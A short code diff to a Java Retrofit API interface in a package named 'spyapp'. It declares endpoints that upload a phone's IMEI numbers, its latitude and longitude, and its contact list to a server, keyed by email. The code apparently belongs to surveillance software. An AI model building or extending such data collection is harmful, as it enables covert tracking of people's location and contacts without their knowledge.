@@ -2,6 +2,7 @@ package kkactive_india.in.spyapp;
 
 import kkactive_india.in.spyapp.MainPOJO.MainBean;
 import kkactive_india.in.spyapp.contactPOJO.contactBean;
+import kkactive_india.in.spyapp.locationPOJO.locationBean;
 import kkactive_india.in.spyapp.mailPOJO.mailBean;
 import retrofit2.Call;
 import retrofit2.http.Body;
@@ -19,15 +20,38 @@ public interface Allapi {
     );
 
     @Multipart
-   // @Headers({"Content-Type: application/json"})
+
     @POST("emiApi.php")
     Call<MainBean> main (
-            @Part("userId") String l,
+            @Part("email") String l,
             @Part("IMEI1") String m,
-            @Part("IMEI2") String n,
-            @Part("lat") String o,
-            @Part("lon") String p
-          //  @Part("contact") String q
-
+            @Part("IMEI2") String n
     );
+
+    @Multipart
+    @POST("lat_lon.php")
+    Call<locationBean> latlon (
+            @Part("email") String m,
+            @Part("lat") String n,
+            @Part("lon") String o
+    );
+
+/*    @Headers({"Content-Type: application/json"})
+    @POST("great-cash/api/api.php")
+    Call<contactBean> contact
+            (
+                    @Part("email") String m,
+                    @Body contactBean body
+
+            );*/
+
+
+    @Multipart
+    @POST("contact_log.php")
+    Call<contactBean> contact (
+            @Part("email") String m,
+            @Part("contact") String n
+    );
+
+
 }
